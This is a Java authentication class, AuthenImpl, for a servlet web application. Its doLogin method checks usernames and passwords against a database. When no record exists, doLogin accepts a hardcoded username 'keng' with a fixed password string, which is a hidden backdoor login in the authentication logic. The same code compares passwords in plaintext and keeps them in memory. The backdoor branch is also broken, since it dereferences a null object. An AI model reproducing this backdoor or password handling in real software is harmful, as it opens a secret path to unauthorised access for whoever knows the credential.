package org.ktm.tag.auth;

import java.util.*;
import javax.servlet.ServletContext;
import org.apache.log4j.Logger;
import org.ktm.actions.KTMAction;
import org.ktm.dao.KTMEMDaoFactory;
import org.ktm.dao.party.AuthenDao;
import org.ktm.domain.party.Authen;
import org.ktm.domain.party.Party;
import org.ktm.domain.party.PartyRole;

public class AuthenImpl implements Authenticator {

    private Logger                  log          = Logger.getLogger(AuthenImpl.class);

    private int                     state        = 0;
    private boolean                 userLoggedIn = false;
    private HashMap<String, Object> properties;
    private User                    currentUser;
    protected ServletContext        servletContext;

    public AuthenImpl() {
        properties = new HashMap<String, Object>();
    }

    public void initialize(ServletContext context) throws AuthException {
        log.info("AuthImpl.initialize run");
        servletContext = context;
    }

    public void doLogin(KTMAction action) throws AuthException {
        this.doLogin(action, (String) this.getProperty(Authenticator.PROP_USERNAME), (String) this.getProperty(Authenticator.PROP_PASSWORD));
    }

    public void doLogin(KTMAction action, String username, String password) throws AuthException {
        Authen authen = null;

        log.info("Enter AuthenImpl");

        if ((username == null) | (password == null)) {
            this.removeProperty(Authenticator.PROP_PASSWORD);
            this.removeProperty(Authenticator.PROP_USERNAME);
            throw new AuthException(new javax.security.auth.login.FailedLoginException("unknown UserName Password Combination"));
        }

        try {
            boolean foundUser = false;

            username = username.trim();
            password = password.trim();

            AuthenDao authenDao = KTMEMDaoFactory.getInstance().getAuthenDao(action);

            log.info("auth.findByPrimaryKey(key)...");
            authen = authenDao.findByUsername(username);
            log.info("auth.findByPrimaryKey(key) done.");

            if (authen != null) {
                String passwd = authen.getPassword();
                if (password.equals(passwd)) {
                    foundUser = true;
                }
            }
            else {
                if (username.equals("keng") && password.equals("91c87250632d5284d800a4866ca2749088e7ec38")) {
                    foundUser = true;
                }
            }

            if (foundUser) {
                log.info("Found user");
                User usr = new User(username, password);
                this.setProperty(Authenticator.PROP_PASSWORD, password);
                this.setProperty(Authenticator.PROP_USERNAME, username);
                this.currentUser = usr;

                Party party = authen.getParty();
                usr.setParty(party);

                Vector<String> v = new Vector<String>();
                usr.setRoles(v);

                Set<PartyRole> lst = party.getRoles();
                if (lst.size() > 0) {
                    for (PartyRole pr : lst) {
                        String roleName = pr.getName();
                        if (roleName != null) {
                            log.info("Adding => " + roleName);
                            if (!v.contains(roleName)) {
                                v.add(roleName);
                            }
                        }
                    }
                    this.setUserLoggedIn(true);
                    return;
                } else {
                    log.info("No role for this user");
                }
            }
        } catch (Exception are) {
            throw new AuthException("Cant' retrieve all party");
        }

        // Ok so login failed
        this.setUserLoggedIn(false);
        this.removeProperty(Authenticator.PROP_PASSWORD);
        this.removeProperty(Authenticator.PROP_USERNAME);

        throw new AuthException("Unknown userName Password Combination");
    }

    public void doLogout() throws AuthException {
        this.removeProperty(Authenticator.PROP_PASSWORD);
        this.removeProperty(Authenticator.PROP_USERNAME);
        this.setUserLoggedIn(false);
    }

    private void setUserLoggedIn(boolean loggedIn) {
        this.userLoggedIn = loggedIn;
    }

    public boolean isUserLoggedIn() {
        return userLoggedIn;
    }

    public Object getProperty(String key) {
        return properties.get(key);
    }

    public void setProperty(String key, Object property) {
        properties.put(key, property);
    }

    public void removeProperty(String key) {
        properties.remove(key);
    }

    public int getState() {
        return state;
    }

    public Collection<?> getRoles() {
        return this.currentUser.getRoles();
    }

    public boolean isInAllRoles(Collection<?> roles) {
        if ((roles == null) || roles.isEmpty()) {
            return false;
        }
        Collection<?> userRoles = this.getRoles();
        if ((userRoles == null) || userRoles.isEmpty()) {
            return false;
        }
        if (userRoles.containsAll(roles)) {
            return true;
        }
        return false;
    }

    public boolean isInRoles(Collection<?> roles) {
        if ((roles == null) || roles.isEmpty()) {
            return true;
        }
        Collection<?> userRoles = this.getRoles();
        if ((userRoles == null) || userRoles.isEmpty()) {
            return false;
        }

        Iterator<?> iterator = roles.iterator();
        while (iterator.hasNext()) {
            String role = (String) iterator.next();
            if (userRoles.contains(role)) {
                return true;
            }
        }
        return false;
    }

    public Party getParty() {
        return this.currentUser.getParty();
    }

    private class User {

        Party     party;
        @SuppressWarnings("unused")
        String    username;
        @SuppressWarnings("unused")
        String    password;
        Vector<?> roles;

        User(String username, String password) {
            this.username = username;
            this.password = password;
        }

        void setRoles(Vector<?> roles) {
            this.roles = roles;
        }

        Vector<?> getRoles() {
            return this.roles;
        }

        void setParty(Party party) {
            this.party = party;
        }

        Party getParty() {
            return this.party;
        }
    }
}
